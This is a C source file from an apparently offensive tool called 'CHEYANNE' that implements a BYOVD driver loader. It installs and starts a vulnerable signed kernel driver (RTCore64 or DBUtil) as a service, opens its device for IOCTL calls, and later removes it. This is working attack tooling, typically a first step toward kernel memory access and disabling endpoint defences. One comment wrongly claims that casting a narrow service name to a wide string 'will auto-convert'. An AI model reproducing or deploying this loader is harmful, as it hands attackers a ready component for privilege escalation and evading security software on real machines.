/*
 * byovd_loader.c — CHEYANNE BYOVD Driver Lifecycle
 * 22DIV / george wu
 *
 * Loads a vulnerable signed driver via Service Control Manager,
 * opens the device handle for IOCTL communication.
 */

#include "byovd.h"
#include <stdio.h>

BOOL byovd_init(BYOVD_CTX *ctx, BYOVD_DRIVER driver, const wchar_t *driver_path)
{
    memset(ctx, 0, sizeof(*ctx));
    ctx->driver = driver;
    ctx->hDevice = INVALID_HANDLE_VALUE;
    wcscpy_s(ctx->driver_path, MAX_PATH, driver_path);

    if (driver == DRIVER_RTCORE64)
        strcpy_s(ctx->service_name, sizeof(ctx->service_name), RTCORE_SERVICE_NAME);
    else
        strcpy_s(ctx->service_name, sizeof(ctx->service_name), DBUTIL_SERVICE_NAME);

    return TRUE;
}

BOOL byovd_load_driver(BYOVD_CTX *ctx)
{
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        printf("  [!] OpenSCManager failed (%lu) — need admin\n", GetLastError());
        return FALSE;
    }

    wchar_t abs_path[MAX_PATH];
    GetFullPathNameW(ctx->driver_path, MAX_PATH, abs_path, NULL);

    SC_HANDLE hService = OpenServiceA(hSCM, ctx->service_name, SERVICE_ALL_ACCESS);
    if (hService) {
        SERVICE_STATUS ss;
        ControlService(hService, SERVICE_CONTROL_STOP, &ss);
        DeleteService(hService);
        CloseServiceHandle(hService);
        hService = NULL;
    }

    hService = CreateServiceW(
        hSCM,
        (wchar_t *)ctx->service_name,     /* will auto-convert for A-name services */
        L"CHEYANNE BYOVD",
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        abs_path,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceA(hSCM, ctx->service_name, SERVICE_ALL_ACCESS);
        } else {
            printf("  [!] CreateService failed (%lu)\n", err);
            CloseServiceHandle(hSCM);
            return FALSE;
        }
    }

    if (!StartServiceA(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("  [!] StartService failed (%lu)\n", err);
            DeleteService(hService);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return FALSE;
        }
    }

    printf("  [+] Driver loaded: %s\n", ctx->service_name);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return TRUE;
}

BOOL byovd_open_device(BYOVD_CTX *ctx)
{
    const char *device_name;

    if (ctx->driver == DRIVER_RTCORE64)
        device_name = RTCORE_DEVICE_NAME;
    else
        device_name = DBUTIL_DEVICE_NAME;

    ctx->hDevice = CreateFileA(
        device_name,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (ctx->hDevice == INVALID_HANDLE_VALUE) {
        printf("  [!] CreateFile(%s) failed (%lu)\n", device_name, GetLastError());
        return FALSE;
    }

    printf("  [+] Device handle acquired: %s\n", device_name);
    return TRUE;
}

void byovd_unload(BYOVD_CTX *ctx)
{
    if (ctx->hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx->hDevice);
        ctx->hDevice = INVALID_HANDLE_VALUE;
    }

    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hService = OpenServiceA(hSCM, ctx->service_name, SERVICE_ALL_ACCESS);
        if (hService) {
            SERVICE_STATUS ss;
            ControlService(hService, SERVICE_CONTROL_STOP, &ss);
            DeleteService(hService);
            CloseServiceHandle(hService);
            printf("  [+] Driver unloaded: %s\n", ctx->service_name);
        }
        CloseServiceHandle(hSCM);
    }
}
